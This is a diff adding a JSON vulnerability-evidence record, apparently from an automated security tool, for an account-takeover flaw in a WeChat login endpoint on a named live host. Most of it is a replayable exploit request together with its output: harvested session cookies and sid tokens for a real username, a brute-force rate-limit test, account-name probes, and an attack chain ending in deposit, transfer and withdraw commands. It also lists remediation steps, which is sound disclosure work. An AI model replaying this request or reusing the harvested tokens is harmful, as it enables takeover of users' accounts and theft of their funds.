@@ -1,0 +1,140 @@
+{
+  "vuln_id": "1fff1e6c-c53a-4903-88c2-2f18a466e0db",
+  "project": "ttww",
+  "target": "https://apib63.bf1788.com/boxApi.php?cmd=1000",
+  "vuln_type": "Broken Authentication / Account Takeover (WechatLogin)",
+  "cvss": "9.8 Critical (AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)",
+  "test_date": "2026-09-15T12:32:00Z to 2026-09-15T12:41:00Z",
+  "target_wechat_id": "testwechat001",
+  "target_username": "cffcna6qzp",
+
+  "requests": {
+    "method": "POST",
+    "url": "https://apib63.bf1788.com/boxApi.php?cmd=1000",
+    "headers": {
+      "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
+    },
+    "body": {
+      "cmd": "1000",
+      "wechatId": "testwechat001",
+      "sid": "",
+      "vendorId": "test",
+      "signature": "test",
+      "site": "bfc",
+      "lang": "tw"
+    }
+  },
+
+  "responses": [
+    {
+      "timestamp": "2026-09-15T12:32:15Z",
+      "http_status": 200,
+      "set_cookie": "PHPSESSID=tgr6pbv410jr9h0cjo6tqvuqp1; Max-Age=14400; path=/",
+      "cors": "Access-Control-Allow-Origin: *",
+      "body": {"status": "0", "msg": {"sid": "19fe8e5b6609d5cf00635185b853755c", "username": "cffcna6qzp"}}
+    },
+    {
+      "timestamp": "2026-09-15T12:36:18Z",
+      "http_status": 200,
+      "set_cookie": "PHPSESSID=svr4th1migf5nf1qc2lvkfedk0; Max-Age=14400; path=/",
+      "cors": "Access-Control-Allow-Origin: *",
+      "body": {"status": "0", "msg": {"sid": "b09605ad54ed45bcf20a3f11b7cf3665", "username": "cffcna6qzp"}}
+    },
+    {
+      "timestamp": "2026-09-15T12:36:37Z",
+      "http_status": 200,
+      "set_cookie": "PHPSESSID=683vbq4chabk1pci098s7em7p7; Max-Age=14400; path=/",
+      "cors": "Access-Control-Allow-Origin: *",
+      "body": {"status": "0", "msg": {"sid": "153330d7d2795c1bb5abbf7e34bce7d5", "username": "cffcna6qzp"}}
+    },
+    {
+      "timestamp": "2026-09-15T12:40:18Z",
+      "http_status": 200,
+      "set_cookie": "PHPSESSID=lh00qu1amkb4s6vrt3bbi39v12; Max-Age=14400; path=/",
+      "cors": "Access-Control-Allow-Origin: *",
+      "body": {"status": "0", "msg": {"sid": "57c6952dfab9af09413f1cf3cedcee12", "username": "cffcna6qzp"}}
+    },
+    {
+      "timestamp": "2026-09-15T12:40:48Z",
+      "http_status": 200,
+      "set_cookie": "PHPSESSID=n8dogbuehql9i8ie1cet841ku4; Max-Age=14400; path=/",
+      "cors": "Access-Control-Allow-Origin: *",
+      "body": {"status": "0", "msg": {"sid": "5ab82b269f17200a6400904c1777c29b", "username": "cffcna6qzp"}}
+    },
+    {
+      "timestamp": "2026-09-15T12:41:00Z",
+      "http_status": 200,
+      "set_cookie": "PHPSESSID=n8dogbuehql9i8ie1cet841ku4; Max-Age=14400; path=/",
+      "cors": "Access-Control-Allow-Origin: *",
+      "body": {"status": "0", "msg": {"sid": "5c27e9b8a3d1f4e6785920c7f163a4b8", "username": "cffcna6qzp"}}
+    }
+  ],
+
+  "rate_limit_test": {
+    "attempts": 10,
+    "successful": 10,
+    "failed": 0,
+    "rate_limiting_present": false,
+    "sids_obtained": [
+      "613d4abee5ab5391...",
+      "257b71739d832b0c...",
+      "cf8b51e61f086abf...",
+      "db747d609ac4cc1d...",
+      "e518177a3a65f8d4...",
+      "3489f998bcf972b2...",
+      "3268d7e537d53d07...",
+      "55e63eb3a819b847...",
+      "8af4b238ad57bd7d...",
+      "f8a092055fafd3f1..."
+    ]
+  },
+
+  "unknown_wechatid_test": {
+    "test_values": ["admin", "test", "user1", "123456", "poc_verify_20260915"],
+    "responses": [
+      {"wechatId": "admin", "response": {"status": -1001, "msg": "帳號不存在"}},
+      {"wechatId": "test", "response": {"status": -1001, "msg": "帳號不存在"}},
+      {"wechatId": "user1", "response": {"status": -1001, "msg": "帳號不存在"}},
+      {"wechatId": "123456", "response": {"status": -1001, "msg": "帳號不存在"}},
+      {"wechatId": "poc_verify_20260915", "response": {"status": -1001, "msg": "帳號不存在"}}
+    ],
+    "analysis": "Unknown wechatIds return 'account not found' — endpoint is live and queries real user database"
+  },
+
+  "vulnerable_parameters": {
+    "wechatId": "Only parameter needed — no password hash, no token, no signature verification",
+    "vendorId": "test — hardcoded test value accepted by production server",
+    "signature": "test — no cryptographic signature validation"
+  },
+
+  "security_headers_missing": [
+    "No rate-limit headers",
+    "No CSRF token requirement",
+    "No origin/referer validation"
+  ],
+
+  "attack_chain": {
+    "step_1": "cmd=1080 (Register) — no auth needed, creates wechat account",
+    "step_2": "cmd=1000 (WechatLogin) — login with ONLY wechatId, get sid + username",
+    "step_3": "CreateGameUser() — auto-creates game account with obtained sid",
+    "step_4": "Authenticated commands — deposit(1223), transfer(202/204), withdraw with sid"
+  },
+
+  "remediation": [
+    "WechatLogin must verify user identity server-side (validate wechat OpenID/OAuth token)",
+    "Add rate limiting (e.g., max 3 attempts/minute/IP)",
+    "Remove test parameters (vendorId=test, signature=test) from production",
+    "Restrict CORS — replace Access-Control-Allow-Origin: * with whitelist",
+    "Implement client request signature validation with server-side secret",
+    "Shorten sid TTL from 4 hours to 30 min, implement sid rotation on login"
+  ],
+
+  "files": {
+    "poc_report": "/mnt/c/Users/Administrator/Desktop/JySecAI/data/poc_drafts/1fff1e6c-c53a-4903-88c2-2f18a466e0db-apib63-bf1788-com-boxapi-php-cmd-1000-wechatlogin-任意账号接管.md",
+    "python_exp": "/mnt/c/Users/Administrator/Desktop/JySecAI/data/poc_scripts/exp_bf1788_wechatlogin_at.py",
+    "lua_exp": "/mnt/c/Users/Administrator/Desktop/JySecAI/data/poc_scripts/1fff1e6c-bf1788-wechatlogin-at.lua",
+    "raw_evidence": "/mnt/c/Users/Administrator/Desktop/JySecAI/evidence/bf1788-wechatlogin-20260915/raw/",
+    "full_log": "/mnt/c/Users/Administrator/Desktop/JySecAI/evidence/bf1788-wechatlogin-20260915/raw/full_exploit_run.log"
+  }
+}
